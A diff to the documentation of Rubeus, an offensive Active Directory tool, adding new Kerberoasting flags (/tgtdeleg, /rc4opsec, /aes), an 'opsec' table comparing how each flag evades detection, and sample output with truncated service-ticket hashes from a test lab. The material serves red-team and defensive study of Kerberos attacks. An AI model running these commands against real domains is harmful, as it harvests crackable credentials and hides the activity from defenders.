@@ -125,8 +125,14 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform Kerberoasting with an existing TGT:
             Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI>
 
-        Perform Kerberoasting using the tgtdeleg ticket to requestion service tickets:
-            Rubeus.exe kerberoast /spn:"blah/blah" /usetgtdeleg
+        Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
+            Rubeus.exe kerberoast /tgtdeleg
+
+        Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
+            Rubeus.exe kerberoast /rc4opsec
+
+        Perform AES Kerberoasting:
+            Rubeus.exe kerberoast /aes
 
         Perform AS-REP "roasting" for any users without preauth:
             Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
@@ -1524,7 +1530,7 @@ Breakdown of the roasting commands:
 
 ### kerberoast
 
-The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket. Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.
+The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket (for default behavior, see the table at the end of this section for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.
 
 With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
 
@@ -1532,9 +1538,23 @@ The `/outfile:FILE` argument outputs roasted hashes to the specified file, one p
 
 If the the TGT `/ticket:X` supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If `/ticket:X` is used with `/spn:Y` then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with `/dc:Z`.
 
-If the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If the default KerberosRequestorSecurityToken method fails, this is an alternative method.
+If the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If this flag is used, accounts with AES enabled in **msDS-SupportedEncryptionTypes** (but still have RC4 enabled) will have RC4 tickets requested.
+
+If the `/aes` flag is supplied, accounts with AES encryption enabled in **msDS-SupportedEncryptionTypes** are enumerated and AES service tickets are requested.
+
+If the `/rc4opsec` flag is specified, the **tgtdeleg** trick is used, and accounts **without** AES enabled are enumerated and roasted.
 
 If you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
+
+Here is a table comparing the behavior of various flags from an opsec perspective:
+
+| Arguments     | Description |
+| ----------- | ----------- |
+| **none** | Enumerate accounts with RC4 enabled, use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |
+| **/tgtdeleg** | Use the **tgtdeleg** trick to perform TGS-REQ requests of RC4-enabled accounts, roast all accounts w/ RC4 specified |
+| **/rc4opsec** | Use the **tgtdeleg** trick, enumerate accounts _without_ AES enabled, roast w/ RC4 specified |
+| **/aes** | Enumerate accounts with AES enabled, use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |
+| **/aes /tgtdeleg** | Use the **tgtdeleg** trick, enumerate accounts with AES enabled, roast w/ AES specified |
 
 Kerberoasting all users in the current domain:
 
@@ -1727,6 +1747,34 @@ Kerberoasting using an existing TGT:
 
     [*] Target SPN             : asdf/asdfasdf
     [*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...
+
+"Opsec" Kerberoasting, using the **tgtdeleg** trick, filtering out AES-enabled accounts:
+
+    C:\Rubeus>Rubeus.exe kerberoast /rc4opsec
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.6
+
+
+    [*] Action: Kerberoasting
+
+    [*] Using 'tgtdeleg' to request a TGT for the current user
+    [*] Searching the current domain for Kerberoastable users
+    [*] Searching for accounts that only support RC4_HMAC, no AES
+
+    [*] Found 6 users to Kerberoast!
+
+    [*] SamAccountName         : harmj0y
+    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+    [*] ServicePrincipalName   : asdf/asdfasdf
+    [*] Supported ETypes       : RC4_HMAC_DEFAULT
+    [*] Hash                   : $krb5tgs$23$*harmj0y$testlab.local$asdf/asdfasdf*$6B4AD4B61D37D54...(snip)...
 
 
 ### asreproast
